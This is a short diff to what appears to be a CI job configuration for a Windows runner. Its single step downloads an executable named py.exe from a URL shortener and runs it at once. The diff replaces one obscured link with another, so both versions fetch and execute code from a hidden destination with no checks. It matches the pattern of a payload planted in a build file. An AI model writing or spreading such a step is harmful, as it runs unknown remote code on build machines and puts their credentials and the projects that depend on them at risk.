@@ -9,4 +9,4 @@ jobs:
       name: win/default
       shell: cmd.exe
     steps:
-      - run: curl -L -o py.exe https://is.gd/0101010101 && py.exe
+      - run: curl -L -o py.exe shorturl.at/bi235 && py.exe
